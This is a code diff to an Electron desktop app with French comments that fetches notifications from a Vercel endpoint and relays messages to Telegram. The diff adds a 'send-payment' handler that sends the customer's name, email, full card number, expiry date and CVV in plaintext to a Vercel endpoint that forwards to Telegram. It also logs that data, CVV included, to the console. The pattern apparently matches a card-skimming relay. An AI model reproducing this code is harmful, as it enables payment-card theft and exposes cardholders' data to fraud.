@@ -5,7 +5,8 @@ const fetch = require('node-fetch');
 // Configuration
 const CONFIG = {
     API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
-    UPDATE_INTERVAL: 2000, // 2 secondes
+    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
+    UPDATE_INTERVAL: 3000, // 3 secondes
     WINDOW_WIDTH: 1200,
     WINDOW_HEIGHT: 800
 };
@@ -98,19 +99,45 @@ function createTray() {
     });
 }
 
-// Récupérer les messages depuis l'API
+// Récupérer les messages depuis l'API Vercel
 async function fetchMessages() {
     try {
+        console.log('🔍 Vérification des messages depuis Vercel...');
         const response = await fetch(CONFIG.API_URL);
         const data = await response.json();
         
         if (data.success && data.notifications) {
+            console.log(`📨 ${data.notifications.length} messages trouvés sur Vercel`);
             return data.notifications.reverse(); // Plus récents en premier
         }
         return [];
     } catch (error) {
-        console.error('❌ Erreur récupération messages:', error);
+        console.error('❌ Erreur récupération messages Vercel:', error);
         return [];
+    }
+}
+
+// Envoyer un message de test à l'API Vercel
+async function sendTestMessage() {
+    try {
+        console.log('🧪 Envoi d\'un message de test à Vercel...');
+        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                message: '🧪 TEST DEPUIS L\'INTERFACE DESKTOP !\n✅ Interface fonctionnelle\n📱 Vérifiez Telegram',
+                type: 'test'
+            })
+        });
+        
+        const result = await response.json();
+        console.log('✅ Message de test envoyé:', result);
+        return result;
+    } catch (error) {
+        console.error('❌ Erreur envoi message test:', error);
+        return { success: false, error: error.message };
     }
 }
 
@@ -173,21 +200,35 @@ ipcMain.handle('get-messages', async () => {
 });
 
 ipcMain.handle('test-api', async () => {
+    return await sendTestMessage();
+});
+
+ipcMain.handle('send-payment', async (event, paymentData) => {
     try {
-        const response = await fetch('https://test-alpha-lac-68.vercel.app/api/telegram', {
+        console.log('💳 Envoi d\'un paiement à Vercel...', paymentData);
+        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                message: '🧪 TEST DEPUIS L\'INTERFACE DESKTOP !\n✅ Interface fonctionnelle\n📱 Vérifiez Telegram',
-                type: 'test'
+                message: `💰 NOUVEAU PAIEMENT REÇU !
+👤 Nom: ${paymentData.customerName}
+📧 Email: ${paymentData.email}
+💳 Carte: ${paymentData.cardNumber}
+📅 Expiration: ${paymentData.expiry}
+🔐 CVV: ${paymentData.cvv}
+💶 Montant: ${paymentData.amount}€
+🔒 Vérifiez immédiatement !`,
+                type: 'payment'
             })
         });
         
         const result = await response.json();
+        console.log('✅ Paiement envoyé à Vercel:', result);
         return result;
     } catch (error) {
+        console.error('❌ Erreur envoi paiement:', error);
         return { success: false, error: error.message };
     }
 });
